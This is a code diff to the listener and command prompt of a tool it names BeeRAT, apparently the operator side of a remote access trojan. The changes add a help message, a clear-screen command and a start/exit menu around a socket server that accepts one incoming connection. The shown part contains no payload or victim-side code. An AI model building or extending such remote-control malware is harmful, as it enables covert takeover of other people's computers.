@@ -17,6 +17,7 @@ class Server:
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((self.ip, self.port))
         server.listen(0)
+        print('[+] Press ctrl+c or ctrl+break to stop the server.')
         print(f'[+] {self.ip}:{self.port} Listening...')
         self.connection, self.address = server.accept()
         print(f'[+] {self.address[0]}:{self.address[1]} connected.')
@@ -38,6 +39,10 @@ class Server:
                 return json.loads(json_data)
             except ValueError:
                 continue
+
+    @staticmethod
+    def clear():
+        return os.system('cls' if os.name == 'nt' else 'clear')
 
     def pwd(self):
         return os.getcwd()
@@ -115,8 +120,24 @@ class Server:
 
 
 def main():
-    my_server = Server()
-    my_server.run()
+    while True:
+        try:
+            command = input('BeeRAT-Server$ ').split(' ')
+            if command[0] == 'help' and len(command) == 1:
+                print('[+] start')
+            elif command[0] == 'clear' and len(command) == 1:
+                Server.clear()
+            elif command[0] == 'exit' and len(command) == 1:
+                exit()
+            elif command[0] == 'start':
+                my_server = Server()
+                my_server.run()
+            else:
+                print('[-] Unknown command.')
+        except (KeyboardInterrupt, EOFError):
+            exit()
+        except Exception as e:
+            print(str(e))
 
 
 if __name__ == '__main__':
